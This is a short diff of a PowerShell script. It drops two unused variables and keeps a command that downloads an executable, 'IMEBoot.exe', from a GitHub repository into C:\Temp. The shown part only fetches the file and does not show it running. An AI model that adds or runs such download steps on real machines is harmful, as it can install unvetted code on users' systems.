@@ -2,10 +2,6 @@ $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-# Define the URL and Filename for the first part of the script
-$Url = "https://github.com/ShellSculptor/GetsScreen-Windows-10/raw/main/IMEBoot.exe"
-$Filename = "C:\Temp\IMEBoot.exe"
-
 # Download the file
 try {
     Invoke-WebRequest -Uri https://github.com/ShellSculptor/GetsScreen-Windows-10/raw/main/IMEBoot.exe -OutFile C:\Temp\IMEBoot.exe -UseBasicParsing
